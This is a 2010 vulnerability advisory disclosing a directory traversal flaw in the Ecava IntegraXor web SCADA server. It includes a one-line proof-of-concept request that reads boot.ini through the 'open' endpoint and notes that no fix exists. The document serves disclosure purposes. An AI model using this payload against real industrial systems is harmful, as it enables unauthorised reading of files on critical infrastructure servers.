@@ -1,0 +1,73 @@
+Source: http://aluigi.org/adv/integraxor_1-adv.txt
+
+#######################################################################
+
+                             Luigi Auriemma
+
+Application:  Ecava IntegraXor
+              http://www.integraxor.com
+Versions:     <= 3.6.4000.0
+Platforms:    Windows
+Bug :         directory traversal
+Exploitation: remote, versus server
+Date:         21 Dec 2010
+Author:       Luigi Auriemma
+              e-mail: aluigi@autistici.org
+              web:    aluigi.org
+
+
+#######################################################################
+
+
+1) Introduction
+2) Bug
+3) The Code
+4) Fix
+
+
+#######################################################################
+
+===============
+1) Introduction
+===============
+
+
+IntegraXor is a web SCADA server used primarily in Malaysia.
+
+
+#######################################################################
+
+======
+2) Bug
+======
+
+
+The "open" request can be used by an attacker to download files from
+the disk where the server is installed through directory traversal
+attacks.
+
+
+#######################################################################
+
+===========
+3) The Code
+===========
+
+
+http://SERVER:7131/PROJECT_NAME/open?file_name=..\..\..\..\..\..\..\..\..\..\..\boot.ini
+
+where PROJECT_NAME is the name of one of the projects hosted by the
+server.
+
+
+#######################################################################
+
+======
+4) Fix
+======
+
+
+No fix.
+
+
+#######################################################################
